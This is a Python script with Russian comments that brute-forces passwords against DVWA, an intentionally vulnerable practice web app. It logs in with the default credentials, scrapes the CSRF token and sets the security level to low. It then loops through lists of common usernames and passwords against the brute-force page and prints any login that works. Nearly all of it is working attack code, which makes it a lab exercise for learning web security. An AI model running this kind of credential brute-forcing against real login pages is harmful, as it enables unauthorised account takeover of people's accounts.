import requests
import re

base = "http://dvwa.local"
login_url = base + "/login.php"
brute_url = base + "/vulnerabilities/brute/"

session = requests.Session()

# ─────────────────────────────
# 1. Логин в DVWA
# ─────────────────────────────
r = session.get(login_url)
token = re.search(r"user_token'\s+value='(.*?)'", r.text)
user_token = token.group(1)

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": user_token
}

session.post(login_url, data=login_data)
session.cookies.set("security", "low")

print("[+] Успешный вход в DVWA")
print("[+] Cookies:")
for c in session.cookies:
    print(f"    {c.name} = {c.value}")

# ─────────────────────────────
# 2. Данные для brute-force
# ─────────────────────────────
users = [
    "admin",
    "user",
    "test",
    "guest",
    "root"
]

passwords = [
    "123456",
    "12345678",
    "password",
    "password123",
    "admin",
    "admin123",
    "qwerty",
    "qwerty123",
    "letmein",
    "welcome",
    "root",
    "toor"
]

# ─────────────────────────────
# 3. Bruteforce
# ─────────────────────────────
print("\n[*] Запуск brute-force...\n")

for user in users:
    print(f"[>] Проверка пользователя: {user}")

    for pwd in passwords:
        params = {
            "username": user,
            "password": pwd,
            "Login": "Login"
        }

        r = session.get(brute_url, params=params)

        print(f"    [-] {user}:{pwd}")

        if "Welcome to the password protected area" in r.text:
            print("\n" + "=" * 50)
            print(f"[+] УСПЕХ! Найдена учётная запись:")
            print(f"    Пользователь: {user}")
            print(f"    Пароль: {pwd}")
            print("=" * 50)
            exit()

print("\n[-] Подходящие учетные данные не найдены")



